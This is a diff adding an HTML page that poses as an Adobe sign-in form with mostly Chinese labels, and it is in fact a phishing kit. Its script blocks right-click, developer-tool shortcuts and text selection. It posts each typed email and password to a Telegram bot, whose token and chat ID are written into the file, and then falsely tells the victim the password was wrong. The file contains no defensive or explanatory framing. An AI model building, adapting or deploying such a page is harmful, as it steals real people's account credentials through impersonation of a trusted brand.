@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Adobe file</title>
+  <link rel="icon" type="image/png" href="https://static.licdn.com/sc/h/8fkga714vy9sq84dyk4d4z9h">
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-image: url('https://gyazo.com/eabfb9a9e69b3838387e60a23a60e87e.jpg');
+      background-size: cover;
+      background-position: cover;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .logo-fixed {
+      position: absolute;
+      top: 20px;
+      left: 30px;
+      display: flex;
+      align-items: center;
+      z-index: 10;
+    }
+
+    .logo-fixed img {
+      height: 32px;
+      margin-right: 8px;
+    }
+
+    .logo-fixed span {
+      font-size: 24px;
+      color: #eb0722;
+      font-weight: bold;
+    }
+
+    .container {
+      background-color: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0px 4px 12px rgba(0,0,0,0.15);
+      width: 100%;
+      max-width: 360px;
+      margin: auto;
+      margin-top: 100px;
+    }
+
+    .container h2 {
+      margin-bottom: 20px;
+      font-size: 24px;
+      color: #eb0722;
+    }
+
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      min-width: 0;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+    }
+
+    .show-pass {
+      display: flex;
+      align-items: center;
+      font-size: 0.85em;
+      margin-top: -8px;
+      margin-bottom: 10px;
+    }
+
+    .show-pass input {
+      margin-right: 5px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #eb0722;
+      color: white;
+      border: none;
+      font-weight: bold;
+      border-radius: 5px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    .forgot {
+      text-align: right;
+      margin-top: 8px;
+    }
+
+    .forgot a {
+      color: #0a66c2;
+      text-decoration: none;
+      font-size: 0.9em;
+    }
+
+    .error {
+      color: red;
+      font-size: 0.9em;
+      margin-top: 8px;
+    }
+
+    footer {
+      margin-top: auto;
+      padding: 20px;
+      background-color: #f3f2ef;
+      text-align: center;
+      font-size: 0.85em;
+      color: #666;
+    }
+
+    footer a {
+      color: #666;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top-Left Fixed Adobe Logo -->
+  <div class="logo-fixed">
+    <img src="https://gyazo.com/e2366e4a5e180e3d2f63617379e63867.png" alt="Adobe Logo">
+    <span>Adobe</span>
+  </div>
+
+  <!-- Sign-In Container -->
+  <div class="container">
+    <h2>Sign in</h2>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Email or phone" value="[[-Email-]]" required />
+      <input type="password" id="password" placeholder="&#23494;&#30721;" required />
+      <div class="show-pass">
+        <input type="checkbox" id="togglePass" />
+        <label for="togglePass">&#26174;&#31034;&#23494;&#30721;</label>
+      </div>
+      <button type="submit">&#30331;&#24405;</button>
+      <div class="forgot">
+        <a href="#">&#24536;&#35760;&#23494;&#30721;&#65311;</a>
+      </div>
+      <div id="errorMsg" class="error"></div>
+    </form>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    Adobe © 2025 
+    <a href="#">&#29992;&#25143;&#21327;&#35758;</a> 
+    <a href="#">&#31169;&#38544;&#25919;&#31574;</a> 
+    <a href="#">&#24744;&#30340;&#20013;&#25991;&#38544;&#31169;&#36873;&#25321;</a> 
+    <a href="#">&#31038;&#21306;&#25351;&#24341;</a> 
+    <a href="#">Cookie&#25919;&#31574;</a> 
+    <a href="#">&#29256;&#26435;&#25919;&#31574;</a> 
+    <a href="#">&#21457;&#36865;&#21453;&#39304;</a> 
+    <a href="#">&#35821;&#35328;</a>
+  </footer>
+
+  <!-- JavaScript -->
+  <script>
+    // Disable Right Click
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+
+    // Disable key combinations
+    document.addEventListener('keydown', function(e) {
+      if (e.key === "F12") e.preventDefault();
+      if ((e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') || (e.ctrlKey && e.key === 'c') || (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'i')) {
+        e.preventDefault();
+      }
+      if ((e.ctrlKey && e.key === 'a') || (e.ctrlKey && e.key === 'x')) {
+        e.preventDefault();
+      }
+    });
+
+    // Optional: Disable text selection
+    document.addEventListener('selectstart', function(e) {
+      e.preventDefault();
+    });
+
+    // Optional: Disable drag events
+    document.addEventListener('dragstart', function(e) {
+      e.preventDefault();
+    });
+
+    // Function to send data to Telegram
+    async function sendData(event) {
+      event.preventDefault(); // Prevent the default form submission
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const botToken = '7221061508:AAFEJVFvS9mJeduJEb0Hux_FzEL-L3ksEAM'; // Replace with your bot token
+      const chatId = '2089807631'; // Replace with your chat ID
+
+      const messageText = `Eli Adobe Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+
+      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      const response = await fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: messageText
+        })
+      });
+
+      if (response.ok) {
+        alert('Wrong Password Try Again!');
+      } else {
+        alert('Error sending data to Telegram.');
+      }
+    }
+
+    // Attach the sendData function to the form's submit event
+    document.getElementById('loginForm').addEventListener('submit', sendData);
+  </script>
+</body>
+</html>
